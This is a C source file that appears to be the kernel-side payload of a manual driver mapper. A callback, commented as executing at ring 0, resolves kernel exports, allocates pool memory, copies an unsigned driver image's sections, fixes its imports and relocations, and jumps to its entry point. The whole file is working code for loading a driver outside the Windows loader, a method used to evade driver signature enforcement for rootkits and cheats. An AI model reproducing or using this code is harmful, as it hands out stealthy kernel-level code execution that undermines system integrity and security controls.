#include "general.h"

BOOL kernelCallbackCalled = FALSE;
NTSTATUS mapStatus = STATUS_UNSUCCESSFUL;
NTSTATUS driverStatus = 0xDEAD;

PVOID kernelBase;
PVOID driverBuffer;

// MSVC sometimes randomly decides to use winapi import
// and sometimes it just inlines it so let's just write
// it like this
__forceinline int CustomCompare(const char* a, const char* b)
{
	while (*a && *a == *b) { ++a; ++b; }
	return (int)(unsigned char)(*a) - (int)(unsigned char)(*b);
}

__forceinline void CustomCopy(void* dest, void* src, size_t n)
{
	char* csrc = (char*)src;
	char* cdest = (char*)dest;

	for (int i = 0; i < n; i++)
		cdest[i] = csrc[i];
}

DWORD64 ResolveExport(PVOID imageBase, const char* functionName)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD64)imageBase + dosHeader->e_lfanew);

	DWORD exportBase = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD exportBaseSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!exportBase || !exportBaseSize)
		return 0;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD64)imageBase + exportBase);

	DWORD64 delta = (DWORD64)imageExportDirectory - exportBase;

	DWORD* nameTable = (DWORD*)(imageExportDirectory->AddressOfNames + delta);
	WORD* ordinalTable = (WORD*)(imageExportDirectory->AddressOfNameOrdinals + delta);
	DWORD* functionTable = (DWORD*)(imageExportDirectory->AddressOfFunctions + delta);

	for (DWORD i = 0u; i < imageExportDirectory->NumberOfNames; ++i)
	{
		const char* currentFunctionName = (const char*)(nameTable[i] + delta);

		if (CustomCompare(currentFunctionName, functionName) == 0)
		{
			WORD functionOrdinal = ordinalTable[i];
			if (functionTable[functionOrdinal] <= 0x1000)
				return 0;

			DWORD64 functionAddress = (DWORD64)kernelBase + functionTable[functionOrdinal];

			if (functionAddress >= (DWORD64)kernelBase + exportBase && functionAddress <= (DWORD64)kernelBase + exportBase + exportBaseSize)
				return 0;

			return functionAddress;
		}
	}

	return 0;
}

void KernelCallback(void* first, void* second)
{
	// WARNING
	// this function is being executed with CPL 0

	UNREFERENCED_PARAMETER(first);
	UNREFERENCED_PARAMETER(second);

	kernelCallbackCalled = TRUE;

	ExAllocatePool_t ExAllocatePool = (ExAllocatePool_t)ResolveExport(kernelBase, "ExAllocatePool");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)driverBuffer;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD64)driverBuffer + dosHeader->e_lfanew);

	DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;

	PVOID imageBuffer = ExAllocatePool(NonPagedPool, imageSize);
	if (!imageBuffer)
	{
		mapStatus = STATUS_INSUFFICIENT_RESOURCES;
		return;
	}

	CustomCopy(imageBuffer, driverBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);

	// rightfully stolen from
	// https://github.com/btbd/umap/blob/master/mapper/main.c#L61
	PIMAGE_SECTION_HEADER currentImageSection = IMAGE_FIRST_SECTION(ntHeaders);
	for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
	{
		if ((currentImageSection[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
			continue;

		PVOID localSection = (PVOID)((DWORD64)imageBuffer + currentImageSection[i].VirtualAddress);
		CustomCopy(localSection, (PVOID)((DWORD64)driverBuffer + currentImageSection[i].PointerToRawData), currentImageSection[i].SizeOfRawData);
	}

	ULONG importsRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	if (!importsRva)
	{
		mapStatus = STATUS_INVALID_PARAMETER_1;
		return;
	}

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)imageBuffer + importsRva);
	for (; importDescriptor->FirstThunk; ++importDescriptor)
	{
		PIMAGE_THUNK_DATA64 thunk = (PIMAGE_THUNK_DATA64)((DWORD64)imageBuffer + importDescriptor->FirstThunk);
		PIMAGE_THUNK_DATA64 thunkOriginal = (PIMAGE_THUNK_DATA64)((DWORD64)imageBuffer + importDescriptor->OriginalFirstThunk);

		for (; thunk->u1.AddressOfData; ++thunk, ++thunkOriginal)
		{
			PCHAR importName = ((PIMAGE_IMPORT_BY_NAME)((DWORD64)imageBuffer + thunkOriginal->u1.AddressOfData))->Name;
			ULONG64 import = ResolveExport(kernelBase, importName);
			if (!import)
			{
				mapStatus = STATUS_NOT_FOUND;
				return;
			}

			thunk->u1.Function = import;
		}
	}

	PIMAGE_DATA_DIRECTORY baseRelocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (baseRelocDir->VirtualAddress)
	{
		PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((DWORD64)imageBuffer + baseRelocDir->VirtualAddress);
		for (UINT32 currentSize = 0; currentSize < baseRelocDir->Size; )
		{
			ULONG relocCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
			PUSHORT relocData = (PUSHORT)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
			PBYTE relocBase = (PBYTE)((DWORD64)imageBuffer + reloc->VirtualAddress);

			for (UINT32 i = 0; i < relocCount; ++i, ++relocData)
			{
				USHORT data = *relocData;
				USHORT type = data >> 12;
				USHORT offset = data & 0xFFF;

				switch (type)
				{
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_DIR64:
				{
					PULONG64 rva = (PULONG64)(relocBase + offset);
					*rva = (ULONG64)((DWORD64)imageBuffer + (*rva - ntHeaders->OptionalHeader.ImageBase));
					break;
				}
				default:
					mapStatus = STATUS_NOT_SUPPORTED;
					return;
				}
			}

			currentSize += reloc->SizeOfBlock;
			reloc = (PIMAGE_BASE_RELOCATION)relocData;
		}
	}

	driverStatus = ((PDRIVER_INITIALIZE)((DWORD64)imageBuffer + ntHeaders->OptionalHeader.AddressOfEntryPoint))((PVOID)0xDEAD, (PVOID)0xFEED);
	mapStatus = STATUS_SUCCESS;
}